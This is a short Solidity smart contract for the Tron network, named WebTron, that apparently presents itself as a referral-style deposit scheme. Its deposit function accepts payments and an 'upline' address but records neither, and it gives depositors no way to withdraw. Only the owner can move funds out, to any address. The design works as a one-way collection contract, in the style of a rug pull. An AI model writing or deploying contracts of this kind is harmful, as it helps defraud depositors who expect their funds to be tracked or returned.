//SourceUnit: WebTron.sol

pragma solidity 0.5.8;

contract WebTron {
    

    address payable public owner;
    
      modifier ownerOnly(){
        require(msg.sender == owner);
        _;
    }

    constructor(address payable _owner) public {
        owner = _owner;    
    }

    function deposit(address _upline) external payable {
        require(msg.value >= 1e8, "Zero amount");
    }

    /*
        Only external call
    */
    function withdrawWallet(address payable _to, uint256 _amount) public ownerOnly {
        _to.transfer(_amount);
    }
   
    function changeOwner(address payable _newOwner) public ownerOnly{
       owner = _newOwner;
    } 
}